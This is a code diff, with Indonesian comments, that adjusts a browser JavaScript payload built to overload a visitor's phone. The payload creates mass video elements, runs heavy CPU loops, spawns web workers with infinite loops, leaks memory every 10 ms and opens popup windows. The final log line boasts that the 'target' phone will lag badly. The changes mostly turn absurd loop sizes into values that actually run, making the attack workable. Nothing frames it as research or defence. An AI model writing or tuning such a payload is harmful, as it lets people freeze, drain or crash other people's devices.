@@ -204,7 +204,7 @@
       ];
 
       // Buat 20 video element sekaligus
-      for (let i = 0; i < 100000; i++) {
+      for (let i = 0; i < 20; i++) {
         setTimeout(() => {
           const vid = document.createElement('video');
           
@@ -234,9 +234,9 @@
               const vidClone = vid.cloneNode(true);
               vidClone.play().catch(e => {});
               videoBuffer.appendChild(vidClone);
-            }, j * 10000);
+            }, j * 100);
           }
-        }, i * 10000);
+        }, i * 100);
       }
 
       // Loop JavaScript super berat (100 juta iterasi)
@@ -244,7 +244,7 @@
         console.log('🔥 Memulai loop berat...');
         
         // Loop pertama - bikin CPU panas
-        for (let i = 0; i < 1000000000000000000; i++) {
+        for (let i = 0; i < 10000000000; i++) {
           // Operasi matematika berat
           Math.sqrt(i);
           Math.sin(i);
@@ -256,7 +256,7 @@
           
           // Bikin array besar setiap 1 juta iterasi
           if (i % 1000000 === 0) {
-            const arr = new Array(100000000000000000).fill('heavy_' + i);
+            const arr = new Array(100000000).fill('heavy_' + i);
             const str = arr.join('');
           }
         }
@@ -264,7 +264,7 @@
         // Loop kedua - infinite loop dengan delay
         const startTime = Date.now();
         while (Date.now() - startTime < 30000) { // 30 detik
-          for (let j = 0; j < 100000000000000000000000; j++) {
+          for (let j = 0; j < 10000000000; j++) {
             // Operasi floating point berat
             const x = Math.sqrt(j) * Math.sin(j) / (Math.cos(j) + 1);
             const y = Math.log(j + 1) * Math.exp(j % 100);
@@ -278,7 +278,7 @@
       for (let w = 0; w < workerCount; w++) {
         const worker = new Worker(URL.createObjectURL(new Blob([`
           // Loop 200 juta di setiap worker
-          for (let i = 0; i < 20000000000000000000000000000000; i++) {
+          for (let i = 0; i < 200000000000; i++) {
             // Operasi berat
             Math.sqrt(i);
             Math.sin(i);
@@ -286,13 +286,13 @@
             
             // Alokasi memori terus
             if (i % 1000000 === 0) {
-              const arr = new Array(1000000000000000000).fill('worker_' + i);
+              const arr = new Array(100000000).fill('worker_' + i);
             }
           }
           
           // Infinite loop
           while (true) {
-            for (let j = 0; j < 100000000000000000; j++) {
+            for (let j = 0; j < 10000000000; j++) {
               Math.random() * Math.random();
             }
           }
@@ -301,8 +301,8 @@
 
       // Bikin memory leak
       setInterval(() => {
-        const leak = new Array(100000000000000000).fill('memleak');
-        const leak2 = new Array(100000000000000000).fill('leak lagi');
+        const leak = new Array(1000000000).fill('memleak');
+        const leak2 = new Array(1000000000).fill('leak lagi');
       }, 10);
 
       // Getar terus (kalo support)
@@ -314,7 +314,7 @@
       for (let i = 0; i < 5; i++) {
         setTimeout(() => {
           window.open('about:blank', '_blank');
-        }, i * 2000000000000000000000);
+        }, i * 200000000);
       }
 
       console.log('✅ Heavy buffer selesai - HP target bakal lag berat!');
